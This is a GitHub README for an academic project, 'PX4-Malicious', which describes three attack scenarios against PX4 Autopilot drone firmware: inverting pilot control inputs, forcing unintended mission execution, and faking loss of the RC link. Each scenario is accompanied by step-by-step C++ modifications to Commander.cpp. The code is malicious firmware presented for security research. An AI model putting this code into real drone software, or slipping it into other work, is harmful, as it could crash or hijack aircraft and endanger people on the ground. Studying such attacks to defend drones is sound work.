# PX4-Malicious
The **PX4-Malicious** project aims to provide a direction for which attacks to prepare for drone service developers by designing attack scenarios based on cases and implementing malicious drone software corresponding to attack scenarios using PX4 Autopilot. 🚁👿  
- [Selected as an Excellent Paper in 2020 KSC Information Security and High-Reliability Computing](http://www.kiise.or.kr/academy/board/academyNewsView.fa?MENU_ID=080100&sch_add_bd=%ED%95%99%ED%9A%8C%EC%86%8C%EC%8B%9D&NUM=2127)

## PX4 Autopilot
**PX4 Autopilot** is an open-source autopilot system for Unmanned Aerial Vehicle. **PX4 Autopilot** guarantees scalability so that the PX4 ecosystem can be maintained by providing a standard for drone hardware and software.  
- [PX4 Github](https://github.com/PX4/PX4-Autopilot)
- [PX4 Autopilot](https://docs.px4.io/master/en/)
- [QGroundControl](http://qgroundcontrol.com/)
- [MAVLink Protocol](https://mavlink.io/en/)

## 3-Factor of Drone Attack
| Content | Description |
| --- | --- |
| Drone Aircraft | Internal factors |
| Ground Control System | External factors |
| Drone Flight Stack | Dynamic factors in the flight process |

## Let's Hack a Drone 👿
### Scenario #1: Generating Control Error
- **Demo**: [YouTube Link](https://youtu.be/SOWdo8h1ZJA)
- **Attack Type**: Drone Aircraft, Drone Flight Stack
- **Attack Point**: Drone Firmware, Commander.cpp
- **Attack Code**:  
<img title="S1" alt="PX4-S1" src="https://user-images.githubusercontent.com/20378368/107301836-9a99ca80-6abf-11eb-9f4d-377eb12872bd.png" width="600"/>  

```
# Step 1: Check whether new data has been published
if(last_setpoint_x != (int)(_manual_control_setpoint.x * 10000) && last_setpoint_y != (int)(_manual_control_setpoint.y *10000))
```
```
# Step 2: Declare a new setpoint & Copy using orb_copy
struct manual_control_setpoint_s temp_setpoint;
orb_copy(ORB_ID(manual_control_setpoint), 1, &temp_setpoint);
```
```
# Step 3: Update the new setpoint in the opposite direction of x and y
temp_setpoint = _manual_control_setpoint;
temp_setpoint.x *= (-1);
temp_setpoint.y *= (-1);
```
```
# Step 4: Publish updated setpoint values
orb_advert_t changed_setpoint = orb_advertise(ORB_ID(manual_control_setpoint), &temp_setpoint);
orb_publish(ORB_ID(manual_control_setpoint), changed_setpoint, &temp_setpoint);
```
```
# Step 5: Save current setpoint value to last_setpoint
last_setpoint_x = (int)(temp_setpoint.x * 10000);
last_setpoint_y = (int)(temp_setpoint.y * 10000);
```

### Scenario #2: Unintended Mission Conduct
- **Demo**: [YouTube Link](https://youtu.be/edIfXTZRIV8)
- **Attack Type**: Drone Aircraft, Ground Control Station, Drone Flight Stack
- **Attack Point**: Drone Firmware, Commander.cpp
- **Attack Code**:  
<img title="S2" alt="PX4-S2" src="https://user-images.githubusercontent.com/20378368/107302293-82767b00-6ac0-11eb-91d9-1a7af3b3755f.png" width="500"/>  

```
# Step 1: Mission structure declaration
mission_s mission;
```
```
# Step 2: Update the result of dataman(Mission, Setpoint) to the newly declared Mission
if (dm_read(DM_KEY_MISSION_STATE, 0, &mission, sizeof(mission_s)) == sizeof(mission_s)) {
    if (mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_0 || mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_1) {
        if (mission.count > 0) {
            PX4_INFO("Mission #%d loaded, %u WPs, curr: %d", mission.dataman_id, mission.count, mission.current_seq);
        }
    }
}
```
```
# Step 3: Publish the updated Mission
_mission_pub.publish(mission);
```
```
# Step 4: Check if Mission is properly published
const bool mission_result_ok = (mission_result.timestamp > _boot_timestamp) 
    && (mission_result.instance_count > 0);
```
```
# Step 5: Check if the Mission is in a state that can be performed
if (status_flags.condition_home_position_valid &&
    (prev_mission_instance_count != mission_result.instance_count)) {

    if (!status_flags.condition_auto_mission_available) {
        // the mission is invalid
        tune_mission_fail(true);

    } else if (mission_result.warning) {
        // the mission has a warning
        tune_mission_fail(true);

    } else {
        // the mission is valid
        tune_mission_ok(true);
    }
}
```
```
# Step 6: Switched to Mission execution mode & Mission perform
main_state_transition(status, commander_state_s::MAIN_STATE_AUTO_MISSION, status_flags, &_internal_state);
```
```
# Step 7: When the mission is over, set flag to false
if(_mission_result_sub.get().finished){
  MESL02_Mission_flag = false;
}
```

### Scenario #3: RC Connection Lost
- **Demo**: [YouTube Link](https://youtu.be/DLxIkqdxU0k)
- **Attack Type**: Ground Control Station, Drone Flight Stack
- **Attack Point**: Drone Firmware, Commander.cpp
- **Attack Code**:  
<img title="S3" alt="PX4-S3" src="https://user-images.githubusercontent.com/20378368/107302870-645d4a80-6ac1-11eb-93f8-88b8ca5c313b.png" width="600"/> 

```
# Step 1: Sending 1000 loss signals
else if(MESL03_Loss_flag <= 1000)
```
```
# Step 2: Convert rc_signal_lost of status structure to true
status.rc_signal_lost = true;
```
```
# Step 3: Set the flag with the updated status using the set_health_flags() function
set_health_flags(subsystem_info_s::SUBSYSTEM_TYPE_RCRECEIVER, true, true, false, status);
_status_changed = true;
```
